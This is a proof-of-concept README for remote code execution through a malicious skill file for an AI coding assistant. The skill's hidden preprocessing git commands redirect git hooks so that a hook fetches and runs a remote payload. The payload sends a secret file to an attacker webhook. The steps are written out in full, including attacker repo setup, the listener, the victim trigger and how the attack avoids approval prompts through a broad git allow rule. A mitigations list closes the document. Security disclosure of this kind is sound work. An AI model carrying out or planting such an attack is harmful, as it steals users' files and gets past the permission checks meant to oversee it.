# RCE via Dynamic Context Injection

PoC: silent RCE when a victim loads a malicious Claude Code skill, using `!` dynamic context injection and git hook smuggling.

## How it works

Claude Code skills support `!`command`` injection — shell commands that execute **before** Claude sees anything, with their stdout injected as context. Combined with git's `core.hooksPath`, this enables RCE with zero approval prompts.

**Attack chain:**

```
Victim: "can you review my code?"
  → Claude matches description, loads code-review skill
  → !` injection fires (preprocessing — invisible to Claude)
      → git fetch        pull attacker's hook from remote repo
      → git worktree add check out hook with executable bit intact
      → git config       redirect git hook lookup to worktree
      → git commit       trigger the hook
          → hook fetches payload.sh from this repo and runs it
          → payload exfiltrates secret.txt to attacker listener
  → Claude returns a normal-looking code review
```

Claude never sees the commands. Victim approves nothing. Output shows `✓ Standards synchronized`.

## Structure

```
dynamic-context-injection/
├── attacker/
│   └── hooks/
│       └── pre-commit   # stager: fetches and runs payload.sh at runtime
├── payload.sh            # payload: exfiltrates secret.txt to webhook
└── victim/
    ├── secret.txt        # dummy target file
    └── .claude/
        ├── settings.json # victim's Claude settings (git:* allowed)
        └── skills/
            └── code-review/
                └── SKILL.md  # malicious skill with !` injection
```

The two-file design separates the stager (committed to the attacker branch) from the payload (on `main`). The payload can be updated without touching the branch the victim already fetched.

## Reproduce

### 1. Attacker setup

Edit `payload.sh` and set your listener address:
```
WEBHOOK="http://<YOUR_IP>:9292"
```

Push `attacker/` content to a **public** git repo on a dedicated branch:
```bash
cd attacker
git init && git checkout -b standards
git add hooks/pre-commit
git update-index --chmod=+x hooks/pre-commit
git commit -m "add standards"
git remote add origin https://github.com/<YOU>/<REPO>.git
git push origin standards
```

Edit `victim/.claude/skills/code-review/SKILL.md` and fill in the placeholders:
```
<ATTACKER_ORG>/<ATTACKER_REPO>.git  →  your repo above
<ATTACKER_BRANCH>                   →  standards
```

### 2. Start listener

```bash
gitar webhook -b
# prints full POST body on each incoming request, default port 9292
```

### 3. Victim setup

```bash
cp -r victim /tmp/victim-repo
cd /tmp/victim-repo
git init && git commit --allow-empty -m "init"
```

Install the skill globally (simulates social engineering: *"run this to get our shared code-review skill"*):
```bash
mkdir -p ~/.claude/skills/code-review
cp .claude/skills/code-review/SKILL.md ~/.claude/skills/code-review/SKILL.md
```

Or keep it project-scoped — the skill is already in `.claude/skills/`.

### 4. Trigger

```bash
cd /tmp/victim-repo && claude
```

In the Claude session:
> can you review my code?

### 5. Observe

Listener receives a POST with base64-encoded `secret.txt`:
```json
{"host":"victims-machine","user":"alice","data":"c3VwZXJfc2VjcmV0..."}
```

Decode: `echo "c3VwZXJfc2VjcmV0..." | base64 -d`

Claude returns a legitimate code review. No approval prompts were shown.

## Why it works

| Property | Detail |
|---|---|
| Invisible to Claude | `!` injection runs at preprocessing — Claude only sees stdout |
| No approval prompts | All commands start with `git`, matched by `Bash(git:*)` allow rule |
| Executable bit preserved | `git worktree add` checks out files with stored mode (100755) |
| Legitimate-looking | Output says `✓ Standards synchronized`; victim gets a real review |
| Persistent | `core.hooksPath` remains set after the session ends |
| Stager/payload split | Payload lives on `main` — update anytime without touching the victim-fetched branch |

## Mitigations

- Treat skill files like executable code — review before installing
- Avoid broad allow rules like `Bash(git:*)` in `.claude/settings.json`
- Audit `.claude/skills/` and `~/.claude/skills/` regularly
- Use `disable-model-invocation: true` on skills that have side effects
- Anthropic: sandbox `!` injection commands or require explicit per-command approval
